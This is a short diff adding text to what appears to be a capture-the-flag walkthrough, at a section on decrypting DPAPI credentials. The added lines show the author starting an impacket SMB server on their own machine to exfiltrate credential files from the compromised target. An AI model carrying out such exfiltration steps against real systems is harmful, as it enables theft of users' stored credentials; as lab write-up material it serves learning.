@@ -780,3 +780,14 @@ Now i have a shell as this user!
 
 # Decrypting DPAPI credentials leads to user compromise
 
+First i have to exfil all these files
+
+```python
+sudo impacket-smbserver share $(pwd) -smb2support -username hacker -password hackme
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+```
+So ill start an SMB server on my machine
+
+```python
+
+```
